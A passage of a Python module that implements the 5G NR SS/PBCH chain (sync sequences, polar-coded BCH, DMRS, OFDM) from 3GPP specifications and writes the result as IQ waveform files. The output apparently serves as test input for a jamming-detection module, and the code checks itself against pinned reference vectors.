    129, 132, 134, 138, 139, 140, 1, 3, 5, 8, 10, 15, 21, 27, 29, 32, 35, 43, 46, 52,
    55, 57, 60, 63, 68, 73, 78, 84, 90, 92, 94, 96, 99, 102, 105, 107, 109, 112, 114, 116,
    121, 124, 128, 130, 133, 135, 141, 6, 11, 16, 22, 30, 33, 36, 44, 47, 64, 74, 79, 85,
    97, 100, 103, 117, 125, 131, 136, 142, 12, 17, 23, 37, 48, 75, 80, 86, 137, 143, 13, 18,
    38, 144, 39, 145, 40, 146, 41, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159,
    160, 161, 162, 163,
]
# Table 7.1.1-1: the payload interleaver G(j) of 38.212 7.1.1. 0..5 take the
# MIB's six systemFrameNumber bits, 6..9 the four SFN LSBs, 10 the half frame
# bit, 11..13 the k_SSB MSB and the candidate SSB index bits, and 14..31 the
# rest of the MIB in increasing bit order.
PBCH_G = [16, 23, 18, 17, 8, 30, 10, 6, 24, 7, 0, 5, 3, 2, 1, 4,
          9, 11, 12, 13, 14, 15, 19, 20, 21, 22, 25, 26, 27, 28, 29, 31]
# Table 5.4.1.1-1: the sub-block interleaver pattern P(i) of 38.212 5.4.1.1.
P_SUBBLOCK = [0, 1, 2, 4, 3, 5, 6, 7, 8, 16, 9, 17, 10, 18, 11, 19,
              12, 20, 13, 21, 14, 22, 15, 23, 24, 25, 26, 28, 27, 29, 30, 31]

# The whole chain pinned at its output for one vector: N_ID^cell = 42,
# i_SSB = 0, L_max = 8, SFN = 37, a_HRF = 0, k_SSB MSB = 0 and the MIB of this
# file's own payload builder (0x040000: the CHOICE selector 0 followed by the
# SFN's six MSBs, 37 >> 4 = 2). "codeword" is the 864 rate-matched bits,
# "scrambled" the same bits after the TS 38.211 7.3.3.1 scrambling with
# nu = i_SSB = 0. Both come from an independent implementation of 38.212 7.1
# and 38.211 7.3.3.1 — never from this file's output — and build_grid()
# refuses to emit a waveform whose chain does not reproduce them.
BCH_PINNED = {
    "pci": 42, "i_ssb": 0, "l_max": 8, "sfn": 37, "hrf": 0, "kssb_msb": 0,
    "codeword":
    "ba9d68d6d0c476ae028f5b1a1cf73143865e1037abeac27cec077a6ec1b3a8254a6ddc049826f1b0"
    "2034b65df27f9be92cf4014046ade0c76b19328c8a9e58d5ba9d68d6d0c476ae028f5b1a1cf731438"
    "65e1037abeac27cec077a6ec1b3a8254a6ddc049826f1b02034b65d",
    "scrambled":
    "e08a233465c1f5e6fe1a6988e04a72c9b4080a80e07bfa6608d20ffd027962c9292bbde9ffc08a30"
    "171b72d9a5ab87f9a9ee08992db1c441231f331bfada48821d6481b040813704e561a45d0de13218"
    "76aac18fea950ba41ab3c91c28e648e2e26f2f72a8f4bb1606eab85a",
}
# What the pinned comparisons actually compared, filled in by build_grid(). A
# printed "agree" line then reports a comparison that ran, never a literal.
CHECKS = {}


def pss_recursive(nid2):
    """d_PSS(n) = 1 - 2*x((n + 43*N_ID(2)) mod 127)."""
    x = [0, 1, 1, 0, 1, 1, 1]
    for i in range(0, 120):
        x.append((x[i + 4] + x[i]) % 2)
    return [1 - 2 * x[(n + 43 * nid2) % 127] for n in range(127)]


def pss_pinned(nid2):
    """The published chips of d_PSS for this N_ID(2), from an independent
    TS 38.211 implementation. This is a second derivation only in the sense
    that matters: it did not come from the recursion above, so comparing the
    two catches a transcription error in either."""
    return list(PSS_PINNED[nid2])


def mseq(init, taps, n_terms):
    """x(i+7) = (x(i+taps[0]) + x(i+taps[1])) mod 2, init = x(0..6)."""
    x = list(init)
    for i in range(0, n_terms + 7):
        x.append((x[i + taps[0]] + x[i + taps[1]]) % 2)
    return x


def sss(nid1, nid2):
    """d_SSS(n) = (1-2*x0((n+m0)mod127))*(1-2*x1((n+m1)mod127)),
    m0 = 15*floor(N_ID(1)/112) + 5*N_ID(2), m1 = N_ID(1) mod 112.
    TS 38.211 7.4.2.3.1: BOTH sequences start from x(0..6) = [1,0,0,0,0,0,0]
    (i.e. [x(6)..x(0)] = [0 0 0 0 0 0 1]) and differ in their recursion —
    x0 taps (4,0), x1 taps (1,0). LTE's pair (PSS init for x0, all-ones for
    x1, both with taps (4,0)) is a different sequence and is wrong here."""
    m0 = 15 * (nid1 // 112) + 5 * nid2
    m1 = nid1 % 112
    x0 = mseq([1, 0, 0, 0, 0, 0, 0], (4, 0), 127 + m0)
    x1 = mseq([1, 0, 0, 0, 0, 0, 0], (1, 0), 127 + m1)
    return [(1 - 2 * x0[(n + m0) % 127]) * (1 - 2 * x1[(n + m1) % 127])
            for n in range(127)]


def gold(c_init, length):
    """TS 38.211 5.2.1, Nc = 1600."""
    nc = 1600
    x1 = [0] * (nc + length + 31)
    x2 = [0] * (nc + length + 31)
    x1[0] = 1
    for i in range(31):
        x2[i] = (c_init >> i) & 1
    for n in range(nc + length):
        x1[n + 31] = (x1[n + 3] + x1[n]) % 2
        x2[n + 31] = (x2[n + 3] + x2[n + 2] + x2[n + 1] + x2[n]) % 2
    return np.array([(x1[n + nc] + x2[n + nc]) % 2 for n in range(length)],
                    dtype=np.int64)


def crc24c(bits):
    """TS 38.212 5.1: gCRC24C(D) = D^24+D^23+D^21+D^20+D^17+D^15+D^13+D^12
    +D^8+D^4+D^2+D+1, the CRC BCH uses (38.212 7.1.3). The clause defines the
    parity by the remainder of a0*D^(A+L-1) + ... + a_{A-1}*D^L + p0*D^(L-1)
    + ... + p_{L-1} divided by g(D), which is the message bits shifted through
    a register starting at ZERO; the register content after the last message
    bit is the parity. Presetting the register to all ones, or feeding 24 extra
    zeros, each gives a different 24-bit word — and because the generator and
    the decoder used to share one wrong expression, their agreement could not
    catch it (the pinned codeword does)."""
    poly = 0
    for e in (24, 23, 21, 20, 17, 15, 13, 12, 8, 4, 2, 1, 0):
        poly |= 1 << e
    reg = 0
    for b in bits:
        msb = (reg >> 23) & 1
        reg = (reg << 1) & 0xFFFFFF
        if msb ^ (b & 1):
            reg ^= poly
    return [(reg >> (23 - i)) & 1 for i in range(24)]


def bits_to_hex(bits):
    """MSB-first hex of a bit list, for a compact pinned comparison."""
    s = "".join("1" if b else "0" for b in bits)
    if len(s) % 4:
        s = "0" * (-len(s) % 4) + s
    return "%0*x" % (len(s) // 4, int(s, 2))


def payload_generate(mib, sfn, hrf, l_max, kssb_msb, ssb_idx):
    """TS 38.212 7.1.1: the 24-bit MIB plus the 8 timing related bits,
    interleaved by Table 7.1.1-1. mib has bit 0 as MSB (the CHOICE selector,
    0 = mib) and the six systemFrameNumber bits at 1..6, which is the layout
    nair_decode_mib decodes. sfn is the full 10-bit SFN: its six MSBs are the
    MIB field and its four LSBs are a_A..a_{A+3}."""
    a = [0] * 32
    for k in range(6):                      # the MIB's six SFN bits -> j 0..5
        a[PBCH_G[k]] = mib[1 + k]
    a[PBCH_G[6]] = (sfn >> 3) & 1           # 4th LSB of the SFN -> j = 6
    a[PBCH_G[7]] = (sfn >> 2) & 1           # 3rd LSB            -> j = 7
    a[PBCH_G[8]] = (sfn >> 1) & 1           # 2nd LSB            -> j = 8
    a[PBCH_G[9]] = sfn & 1                  # 1st LSB            -> j = 9
    a[PBCH_G[10]] = hrf & 1                 # the half frame bit -> j = 10
    if l_max == 10:                         # a_{A+5}..a_{A+7}, 7.1.1
        a[PBCH_G[11]] = kssb_msb & 1
        a[PBCH_G[13]] = (ssb_idx >> 3) & 1
    elif l_max == 20:
        a[PBCH_G[11]] = kssb_msb & 1
        a[PBCH_G[12]] = (ssb_idx >> 4) & 1
        a[PBCH_G[13]] = (ssb_idx >> 3) & 1
    elif l_max == 64:
        a[PBCH_G[11]] = (ssb_idx >> 5) & 1
        a[PBCH_G[12]] = (ssb_idx >> 4) & 1
        a[PBCH_G[13]] = (ssb_idx >> 3) & 1
    else:                                   # L_max = 4 or 8: a_{A+6}, a_{A+7}
        a[PBCH_G[11]] = kssb_msb & 1        # are reserved (left as zeros)
    j = 14
    for i in range(24):                     # the rest of the MIB, increasing i
        if 1 <= i <= 6:
            continue
        a[PBCH_G[j]] = mib[i]
        j += 1
    if j != 32:
        raise SystemExit("ERROR\tthe PBCH payload interleaver placed %d of 32 "
                         "bits" % j)
    return a


def payload_scramble(a, sfn, l_max, ncellid):
    """TS 38.212 7.1.2. The bits of the candidate SS/PBCH block index, the
    half frame bit and the 2nd and 3rd LSBs of the SFN are not scrambled; every
    other bit i becomes a_i + c(j + v*M) mod 2, with M = A-3 for L_max = 4 or 8,
    A-4 for 10, A-5 for 20 and A-6 for 64 — the exclusion count is exactly the
    number of those SSB index bits plus three. v is Table 7.1.2-1 and the
    sequence is initialised with N_ID^cell."""
    m = {4: 29, 8: 29, 10: 28, 20: 27, 64: 26}[l_max]
    v = 2 * ((sfn >> 2) & 1) + ((sfn >> 1) & 1)
    excl = {PBCH_G[7], PBCH_G[8], PBCH_G[10]}
    if l_max == 10:
        excl.add(PBCH_G[13])
    elif l_max == 20:
        excl |= {PBCH_G[12], PBCH_G[13]}
    elif l_max == 64:
        excl |= {PBCH_G[11], PBCH_G[12], PBCH_G[13]}
    c = gold(ncellid, (v + 1) * m)
    out = list(a)
    j = 0
    for i in range(32):
        if i in excl:
            continue
        out[i] = a[i] ^ int(c[j + v * m])
        j += 1
    if j != m:
        raise SystemExit("ERROR\tPBCH payload scrambling covered %d bits, but "
                         "M = %d for L_max = %d" % (j, m, l_max))
    return out


def polar_info_positions(k, n):
    """TS 38.212 5.3.1.2 with 5.4.1.1: when E >= N there is no puncturing and
    no shortening, so the information set Q_I^N is the k most reliable bit
    indices below N, in the order the polar sequence lists them."""
    qn = [q for q in POLAR_Q512 if q < n]
    if k > len(qn):
        raise SystemExit("ERROR\tpolar code K = %d does not fit N = %d" % (k, n))
    return sorted(qn[len(qn) - k:])


def polar_interleave(c, k):
    """TS 38.212 5.3.1.1 with I_IL = 1, which 7.1.4 selects for the BCH:
    c'_k = c_Pi(k), Pi built from Table 5.3.1.1-1 with K_ILmax = 164."""
    off = 164 - k
    out = [c[POLAR_IL_MAX[m] - off] for m in range(164)
           if POLAR_IL_MAX[m] >= off]
    if len(out) != k:
        raise SystemExit("ERROR\tthe polar interleaver produced %d of %d bits"
                         % (len(out), k))
    return out


def polar_encode(c, n):
    """TS 38.212 5.3.1.2: u carries the interleaved bits on Q_I^N and d =
    u * G_N with G_2 = [[1,0],[1,1]]. The Kronecker power is applied as the
    n-stage butterfly that evaluates it over GF(2), not as a dense matrix."""
    k = len(c)
    cp = polar_interleave(c, k)
    u = [0] * n
    for idx, pos in enumerate(polar_info_positions(k, n)):
        u[pos] = cp[idx]
    half = 1
    while half < n:
        step = half << 1
        for i in range(0, n, step):
            for j in range(i, i + half):
                u[j] ^= u[j + half]
        half = step
    return u


def subblock_interleave(d):
    """TS 38.212 5.4.1.1: y_n = d_J(n) with i = floor(32n/N) and
    J(n) = P(i)*(N/32) + mod(n, N/32)."""
    n = len(d)
    if n % 32:
        raise SystemExit("ERROR\tthe polar code length %d is not 32 sub-blocks"
                         % n)
    y = [0] * n
    for k in range(n):
        i = (32 * k) // n
        y[k] = d[P_SUBBLOCK[i] * (n // 32) + (k % (n // 32))]
    return y


def rate_match(d, e, k):
    """TS 38.212 5.4.1.2 bit selection from the circular buffer. With
    E = 864 >= N = 512 Q_F^N,tmp is empty, so this is pure repetition."""
    n = len(d)
    y = subblock_interleave(d)
    if e >= n:
        return [y[i % n] for i in range(e)]
    if k * 16 <= 7 * e:
        return [y[i + n - e] for i in range(e)]
    return [y[i] for i in range(e)]


def bch_encode(mib, sfn, hrf, l_max, kssb_msb, ssb_idx, ncellid):
    """TS 38.212 7.1 end to end: payload generation (7.1.1), scrambling
    (7.1.2), CRC24C (7.1.3), polar coding with n_max = 9 and I_IL = 1 (7.1.4)
    and rate matching to E = 864 (7.1.5)."""
    a = payload_scramble(payload_generate(mib, sfn, hrf, l_max, kssb_msb,
                                          ssb_idx), sfn, l_max, ncellid)
    bits = a + crc24c(a)
    if len(bits) != 56:
        raise SystemExit("ERROR\tthe BCH transport block is %d bits, 7.1.3 "
                         "says 56" % len(bits))
    return rate_match(polar_encode(bits, 512), 864, 56)


def pbch_coded_scramble(f, ncellid, i_ssb, l_max):
    """TS 38.211 7.3.3.1: b~(i) = (b(i) + c(i + nu*M_bit)) mod 2 with
    M_bit = 864, c_init = N_ID^cell and nu the two (L_max = 4) or three
    (L_max > 4) least significant bits of the candidate SS/PBCH block index."""
    nu = i_ssb & (3 if l_max <= 4 else 7)
    c = gold(ncellid, nu * 864 + 864)
    return [f[i] ^ int(c[i + nu * 864]) for i in range(len(f))]


def bch_pin_check():
    """Recompute the chain for the pinned vector and compare with the codeword
    and the scrambled codeword an independent implementation produced. A chain
    that agrees only with itself is what a wrong chain does, so this refuses to
    let the generator emit a waveform at all."""
    mib = mib_payload(BCH_PINNED["sfn"])
    cw = bch_encode(mib, BCH_PINNED["sfn"], BCH_PINNED["hrf"],
                    BCH_PINNED["l_max"], BCH_PINNED["kssb_msb"],
                    BCH_PINNED["i_ssb"], BCH_PINNED["pci"])
    scr = pbch_coded_scramble(cw, BCH_PINNED["pci"], BCH_PINNED["i_ssb"],
                              BCH_PINNED["l_max"])
    CHECKS["bch"] = (864, bits_to_hex(cw) == BCH_PINNED["codeword"])
    CHECKS["bch_scrambled"] = (864, bits_to_hex(scr) == BCH_PINNED["scrambled"])
    if not CHECKS["bch"][1]:
        raise SystemExit("ERROR\tthe BCH chain does not reproduce the pinned "
                         "TS 38.212 7.1 codeword")
    if not CHECKS["bch_scrambled"][1]:
        raise SystemExit("ERROR\tthe TS 38.211 7.3.3.1 scrambling does not "
                         "reproduce the pinned codeword")
    return True


def mib_payload(sfn):
    """TS 38.331 6.2.2 MIB -> the 24-bit BCCH-BCH-Message transport block: the
    1-bit BCCH-BCH-MessageType CHOICE index (0 = mib) followed by the 23 ASN.1
    MIB bits in field order — systemFrameNumber (6),
    subCarrierSpacingCommon (1), ssb-SubcarrierOffset (4), dmrs-TypeA-Position
    (1), pdcch-ConfigSIB1 (8), cellBarred (1), intraFreqReselection (1),
    spare (1). systemFrameNumber is the SIX MSBs of the SFN (38.212 7.1.1
    puts the four LSBs in the PBCH payload, not in the MIB), so sfn is the full
    10-bit SFN and `sfn >> 4` is what lands in the MIB."""
    b = [0]                                           # ...MessageType = mib
    b += [((sfn >> 4) >> i) & 1 for i in range(5, -1, -1)]  # SFN's six MSBs
    b += [0]                                          # subCarrierSpacingCommon
    b += [0, 0, 0, 0]                                 # ssb-SubcarrierOffset 4
    b += [0]                                          # dmrs-TypeA-Position
    b += [0] * 8                                      # pdcch-ConfigSIB1
    b += [0]                                          # cellBarred
    b += [0]                                          # intraFreqReselection
    b += [0]                                          # spare
    assert len(b) == 24, len(b)
    return b


def qpsk(bits):
    """TS 38.211 5.1.3: b(2i),b(2i+1) -> (1-2b)/sqrt(2) + j(1-2b)/sqrt(2)."""
    out = []
    for i in range(0, len(bits) - 1, 2):
        out.append(complex(1 - 2 * bits[i], 1 - 2 * bits[i + 1]) / np.sqrt(2))
    return np.array(out)


def cp_lengths(mu, nslot, nfft):
    """TS 38.211 5.3.1: N_CP = 144*2^-mu samples normally, and
    144*2^-mu + 16 in the 30.72 MHz reference grid for l = 0 and l = 7*2^mu,
    where l is the symbol index **within the subframe**. nslot is the slot
    index within the subframe, so for mu >= 2 only some slots open with the
    long CP — that is what makes every subframe come out at exactly 1 ms.
    512*2^-mu is the extended CP and is not used here.

    At f_s = N_FFT * dF the sample counts are 144*N_FFT/2048 and, for the 16
    extra reference samples, 16*N_FFT*2^mu/2048: both are exact for the
    standard grids (N_FFT = 2048*2^-mu), and a grid where they are not is a
    bug rather than something to round."""
    num_s = 144 * nfft
    num_x = 16 * nfft * (2 ** mu)
    if num_s % 2048 or num_x % 2048:
        raise SystemExit("ERROR\tN_FFT %d is not a multiple of the "
                         "numerology grid 2048*2^-%d" % (nfft, mu))
    short, extra = num_s // 2048, num_x // 2048
    l0 = nslot * 14
    return [short + extra if (l0 + l) in (0, 7 * (2 ** mu)) else short
            for l in range(14)]


def ssb_symbols_in_slot(scs):
    """TS 38.213 4.1: Case A {2,8}+14n, Case B/C/D {4,8,16,20}+28n,
    Case E {8,12,16,20,32,36,40,44}+56n. In symbols of the carrier the first
    SSB of a half-frame starts at index 2 (15/30 kHz) or 4 (120/240 kHz)."""
    if scs in (15,):
        return [2]
    if scs == 30:
        return [4]
    return [4]


def build_grid(pci, scs, nfft, mib_bits, i_ssb, sfn, hrf, l_max, kssb_msb):
    """The four SSB symbols as four 240-long frequency-domain blocks."""
    nid1, nid2 = pci // 3, pci % 3
    pss = pss_recursive(nid2)
    pin = pss_pinned(nid2)
    CHECKS["pss"] = (len(pin), pss[:len(pin)] == pin)
    if not CHECKS["pss"][1]:
        raise SystemExit("ERROR\tPSS for N_ID(2)=%d does not reproduce the "
                         "pinned TS 38.211 chips" % nid2)
    sss_v = sss(nid1, nid2)
    if pci in SSS_PINNED:
        pin = SSS_PINNED[pci]
        CHECKS["sss"] = (len(pin), sss_v[:len(pin)] == pin)
        if not CHECKS["sss"][1]:
            raise SystemExit("ERROR\tSSS for PCI %d does not reproduce the "
                             "pinned TS 38.211 chips" % pci)
    pss = np.array(pss, dtype=complex)
    sss_v = np.array(sss_v, dtype=complex)

    # RE layout, TS 38.211 7.4.3.1 / 7.4.1.4.1. The SSB is 20 RBs = 240 REs
    # over 4 consecutive symbols: PSS (symbol 0) and SSS (symbol 2) take
    # k = 56..182, the PBCH data takes the rest of symbols 1 and 3 plus
    # k = 0..47 and 192..239 of symbol 2 — 432 REs, the 864 polar-coded bits
    # at QPSK — and the DMRS takes every 4th subcarrier of symbols 1 and 3
    # and the same comb inside symbol 2's two PBCH blocks, offset
    # v = N_ID^cell mod 4. The PSS symbol carries no PBCH and no DMRS.
    v = pci % 4
    dmrs_k = {1: list(range(v, 240, 4)),
              2: list(range(v, 48, 4)) + list(range(192 + v, 240, 4)),
              3: list(range(v, 240, 4))}

    # DMRS: TS 38.211 7.4.1.4.1, c_init = 2^11*(i_SSB+1)*(N_ID^cell//4+1)
    # + 2^6*(i_SSB+1) + N_ID^cell mod 4. The pinned chips are the ones this
    # c_init produces at i_SSB = 0, the only i_SSB an independent implementation
    # was pinned for. Another i_SSB is a different sequence with no vector to
    # compare against, so the check reports "not checked" instead of failing a
    # sequence it cannot judge (the decoder still re-derives the comb from the
    # clause and the round trip in the selftest still runs).
    c_init = (2 ** 11) * (i_ssb + 1) * (pci // 4 + 1) + 64 * (i_ssb + 1) + v
    dmrs = qpsk(gold(c_init, 2 * 144))
    if pci in DMRS_PINNED and i_ssb == 0:
        pin = DMRS_PINNED[pci]
        got = "".join(("0" if c.real > 0 else "1") + ("0" if c.imag > 0 else "1")
                      for c in dmrs[:len(pin) // 2])
        CHECKS["dmrs"] = (len(pin) // 2, got == pin)
        if not CHECKS["dmrs"][1]:
            raise SystemExit("ERROR\tPBCH DMRS for PCI %d does not reproduce "
                             "the pinned TS 38.211 chips (c_init = %d)"
                             % (pci, c_init))

    # PBCH data: the 864 coded bits of the BCH chain (TS 38.212 7.1), QPSK
    # modulated after the SS/PBCH block scrambling of TS 38.211 7.3.3.1 and
    # mapped to the 432 PBCH REs in increasing order of k within each of the
    # symbols 1, 2 and 3 — TS 38.211 7.4.3.1.3 orders the mapping by k and then
    # by l, which is the order the DMRS above uses and the order the PBCH RE
    # indices come back in. The PBCH REs are the DMRS comb's complement.
    pbch_re = {}
    for l in (1, 2, 3):
        band = (range(240) if l in (1, 3)
                else list(range(48)) + list(range(192, 240)))
        pbch_re[l] = [k for k in band if k % 4 != v]
    n_pbch_re = sum(len(pbch_re[l]) for l in pbch_re)
    coded = bch_encode(mib_bits, sfn, hrf, l_max, kssb_msb, i_ssb, pci)
    if len(coded) != 864:
        raise SystemExit("ERROR\tthe BCH chain produced %d bits, 38.212 7.1.5 "
                         "says 864" % len(coded))
    f = pbch_coded_scramble(coded, pci, i_ssb, l_max)
    pbch = qpsk(f)

    grids = []
    for l in range(4):
        g = np.zeros(240, dtype=complex)
        if l == 0:
            g[56:183] = pss
        elif l == 2:
            g[56:183] = sss_v
        grids.append(g)
    j = 0
    for l in (1, 2, 3):
        for k in dmrs_k[l]:
            grids[l][k] = dmrs[j]
            j += 1
    if j != 144:
        raise SystemExit("ERROR\tDMRS occupies %d REs, TS 38.211 says 144" % j)
    if len(pbch) != n_pbch_re:
        raise SystemExit("ERROR\t%d PBCH symbols for %d PBCH REs"
                         % (len(pbch), n_pbch_re))
    CHECKS["dmrs_re"] = (144, j == 144)
    CHECKS["pbch_re"] = (432, n_pbch_re == 432)
    CHECKS["pbch_driven"] = (len(pbch), len(pbch) == n_pbch_re)
    n = 0
    for l in (1, 2, 3):
        for k in pbch_re[l]:
            grids[l][k] = pbch[n]
            n += 1
    if n != 432:
        raise SystemExit("ERROR\t%d of 432 PBCH REs were driven" % n)
    return grids


def arg_opt(name, default=None):
    """Value of the flag NAME in sys.argv, or DEFAULT. The burst mode's
    parameters arrive as flags so the slot path's positional interface stays
    exactly what it was for every existing caller."""
    a = sys.argv
    return a[a.index(name) + 1] if name in a else default


def read_back(path, fmt):
    """Read an IQ file with the jamming module's own loader convention
    (modules/33_jamming_detect.sh load_iq): cf32 is interleaved little-endian
    float32, ci16 interleaved int16 / 32768, cu8 unsigned bytes with 127.5
    subtracted and 127.5 as full scale. Written here rather than imported
    because module 33 keeps its loader inside a heredoc; the numbers are its
    numbers, so a file this function accepts is a file that loader accepts."""
    if fmt == "cf32":
        d = np.fromfile(path, dtype="<f4").astype(np.float64)
        return d[0::2] + 1j * d[1::2]
    if fmt == "ci16":
        d = np.fromfile(path, dtype="<i2").astype(np.float64)
        return (d[0::2] + 1j * d[1::2]) / 32768.0
    d = np.fromfile(path, dtype=np.uint8).astype(np.float64)
    return ((d[0::2] - 127.5) + 1j * (d[1::2] - 127.5)) / 127.5


def burst_waveform(out, pci, scs, nfft, sfn):
    """One SS/PBCH burst as complex baseband I/Q, for a receiver to consume as
    a waveform rather than as a grid description.

    TS 38.211 7.4.3.1 puts PSS, SSS, PBCH and PBCH DMRS on 240 consecutive
    subcarriers of 4 consecutive OFDM symbols, and 5.3.1 gives each of those
    symbols its cyclic prefix. The four 240-long blocks come from build_grid(),
    i.e. the very sequences, RE layout and BCH chain that produce the slot
    file; what is added here is only WHERE each block lands in the raster and
    in WHICH sample format it is written.

    The placement needs two numbers a waveform cannot invent: the common
    resource block N_CRB^SSB (offsetToPointA) and k_SSB, the subcarrier offset
    inside it. This module carries no CORESET#0 / point-A table, so both are
    taken as 0 and printed as such: the SSB sits on subcarrier 0 of the raster.
    A baseband grid is DC-centred (the slot path maps the same block to bins
    -120..119), so raster subcarrier r is FFT bin r - N/2.

    Formats and scales are modules/33_jamming_detect.sh's build(): cf32 is
    interleaved float32 I/Q, ci16 int16 at 32767 with the loader's 32768
    divisor, cu8 round(x*127 + 127.5) with the loader's 127.5 full scale.
    """
    fmt = arg_opt("--format", "cf32")
    nrb = int(arg_opt("--nrb", 51))
    i_ssb = int(arg_opt("--i-ssb", 0))
    reps = int(arg_opt("--reps", 1))
    l_max = int(arg_opt("--l-max", 64 if scs >= 120 else 8))
    l0 = int(arg_opt("--l0", 0))
    mu = {15: 0, 30: 1, 60: 2, 120: 3, 240: 4}[scs]
    n_raster = 12 * nrb

    if fmt not in ("cf32", "ci16", "cu8"):
        sys.stderr.write("ERROR\tformat must be cf32|ci16|cu8\n")
        return 2
    if n_raster < 240:
        sys.stderr.write("ERROR\tthe SS/PBCH block is 20 RBs = 240 subcarriers "
                         "(TS 38.211 7.4.3.1); --n-rb %d is narrower\n" % nrb)
        return 2
    if n_raster > nfft:
        sys.stderr.write("ERROR\t--n-rb %d needs %d subcarriers but N_FFT is "
                         "%d\n" % (nrb, n_raster, nfft))
        return 2
    if reps < 1:
        sys.stderr.write("ERROR\t--reps must be >= 1\n")
        return 2
    if not 0 <= i_ssb <= 63:
        sys.stderr.write("ERROR\ti_SSB %d is outside 0..63\n" % i_ssb)
        return 2
    if l_max not in (4, 8, 10, 20, 64):
        sys.stderr.write("ERROR\tL_max %d has no TS 38.212 7.1.1 branch\n" % l_max)
        return 2
    if not 0 <= l0 <= 139:
        sys.stderr.write("ERROR\tburst start symbol %d is outside a radio "
                         "frame\n" % l0)
        return 2
    if 144 * nfft % 2048 or 16 * nfft * (2 ** mu) % 2048:
        sys.stderr.write("ERROR\tN_FFT %d is off the mu=%d numerology grid: the "
                         "CP of TS 38.211 5.3.1 is not a whole number of "
                         "samples at this rate\n" % (nfft, mu))
        return 2

    grids = build_grid(pci, scs, nfft, mib_payload(sfn), i_ssb, sfn, 0, l_max, 0)
    bch_pin_check()

    bins = [(k - n_raster // 2) % nfft for k in range(240)]
    burst = np.zeros(0, dtype=complex)
    raster_re = 0
    cps = []
    for l in range(4):
        f = np.zeros(nfft, dtype=complex)
        for j, b in enumerate(bins):
            f[b] = grids[l][j]
        raster_re += int(np.count_nonzero(f))
        s = l0 + l
        cp = cp_lengths(mu, s // 14, nfft)[s % 14]
        cps.append(cp)
        body = np.fft.ifft(f) * np.sqrt(nfft)
        burst = np.concatenate([burst, body[-cp:], body])

    pss_re = int(np.count_nonzero(grids[0]))
    sss_re = int(np.count_nonzero(grids[2][56:183]))
    ssb_re = sum(int(np.count_nonzero(g)) for g in grids)
    if raster_re != ssb_re:
        sys.stderr.write("ERROR\tthe mapping put %d of the SSB's %d REs into the "
                         "raster\n" % (raster_re, ssb_re))
        return 2

    x = np.tile(burst, reps)
    peak = float(np.max(np.abs(x))) if x.size else 0.0
    if peak <= 0.0:
        sys.stderr.write("ERROR\tthe burst built to all zeros\n")
        return 2
    x = x / peak                      # full scale 1.0, then quantise once
    n = int(x.size)

    def write_iq(xq, fmt, path):
        """Quantise and write in module 33's format conventions. Returns the
        bytes per sample, so the caller can check the file length against it."""
        if fmt == "cf32":
            xq.astype("<c8").tofile(path)
            return 8
        if fmt == "ci16":
            b = np.empty(2 * xq.size, dtype="<i2")
            b[0::2] = np.clip(np.round(xq.real * 32767.0), -32768,
                              32767).astype("<i2")
            b[1::2] = np.clip(np.round(xq.imag * 32767.0), -32768,
                              32767).astype("<i2")
            b.tofile(path)
            return 4
        b = np.empty(2 * xq.size, dtype=np.uint8)
        b[0::2] = np.clip(np.round(xq.real * 127.0 + 127.5), 0,
                          255).astype(np.uint8)
        b[1::2] = np.clip(np.round(xq.imag * 127.0 + 127.5), 0,
                          255).astype(np.uint8)
        b.tofile(path)
        return 2

    # The peak is MEASURED on the file, not assumed from the array: float32
    # rounding of the components can land a hair above 1.0, so the normalising
    # gain is pulled back and the file rewritten until the file itself is at or
    # below full scale. It converges in one extra pass or not at all.
    per = 0
    loaded_peak = 0.0
    gain = 1.0
    for _ in range(6):
        per = write_iq(x * gain, fmt, out)
        back = read_back(out, fmt)
        if back.size != n:
            sys.stderr.write("ERROR\t%s reads back %d samples, %d were "
                             "written\n" % (out, back.size, n))
            return 2
        loaded_peak = float(np.max(np.abs(back)))
        if 0.0 < loaded_peak <= 1.0:
            break
        # One part per 10^6 is far below any real correction and far above the
        # 1.2e-7 float32 resolution, so the rewritten file cannot land on the
        # same rounded components again.
        gain = gain / loaded_peak * (1.0 - 1e-6)
    else:
        sys.stderr.write("ERROR\t%s loads back at peak %.6f, outside (0, 1]: "
                         "the waveform is not full scale\n" % (out, loaded_peak))
        return 2
    import os
    if os.path.getsize(out) != n * per:
        sys.stderr.write("ERROR\t%s is %d bytes, %d samples x %d bytes = %d\n"
                         % (out, os.path.getsize(out), n, per, n * per))
        return 2

    fs = scs * 1000 * nfft
    print("waveform_file\t%s" % out)
    print("format\t%s" % fmt)
    print("rate\t%d" % fs)
    print("samples\t%d" % n)
    print("bytes\t%d" % (n * per))
    print("seconds\t%.6f" % (n / float(fs)))
    print("n_rb\t%d" % nrb)
    print("scs_khz\t%d" % scs)
    print("pci\t%d" % pci)
    print("i_ssb\t%d" % i_ssb)
    print("symbols\t4")
    print("peak_full_scale\t%.6f" % loaded_peak)
    print("peak_ok\t1")
    print("bytes_per_sample\t%d" % per)
    print("ssb_case\t%s" % arg_opt("--case", "unknown"))
    print("fft_size\t%d" % nfft)
    print("mu\t%d" % mu)
    print("l_max\t%d" % l_max)
    print("reps\t%d" % reps)
    print("symbols_total\t%d" % (4 * reps))
    print("cp_pattern\t%s" % ",".join(str(c) for c in cps))
    print("cp_short\t%d" % min(cps))
    print("cp_long\t%d" % max(cps))
    print("start_symbol\t%d" % l0)
    print("slot\t%d" % (l0 // 14))
    print("symbol_in_slot\t%d" % (l0 % 14))
    print("start_symbol_half_frame\t%d" % int(arg_opt("--sym-hf", l0)))
    print("half_frame\t%d" % int(arg_opt("--hf", 0)))
    print("grid_subcarriers\t%d" % n_raster)
    print("ssb_bin_first\t%d" % (0 - n_raster // 2))
    print("ssb_re_pss\t%d" % pss_re)
    print("ssb_re_sss\t%d" % sss_re)
    print("ssb_re_dmrs\t%d" % CHECKS.get("dmrs_re", (0, False))[0])
    print("ssb_re_pbch\t%d" % CHECKS.get("pbch_re", (0, False))[0])
    print("ssb_re\t%d" % ssb_re)
    print("raster_re\t%d" % raster_re)
    print("loaded_samples\t%d" % int(back.size))
    print("format_loader\tmodules/33_jamming_detect.sh load_iq (dtype/scale/"
          "interleave identical)")
    # That loader rejects a file under 2048 samples, so a 20 RB burst at a
    # small raster needs --reps to be readable by it.
    print("consumer_min_samples\t2048")
    print("mapping\tk_SSB=0, offsetToPointA=0 (this module carries no "
          "CORESET#0 table; the MIB these payloads carry has ssb-"
          "SubcarrierOffset = 0, so k_SSB = 0 is what the burst itself says): "
          "SSB subcarrier k -> raster subcarrier k of %d, FFT bin k-%d, "
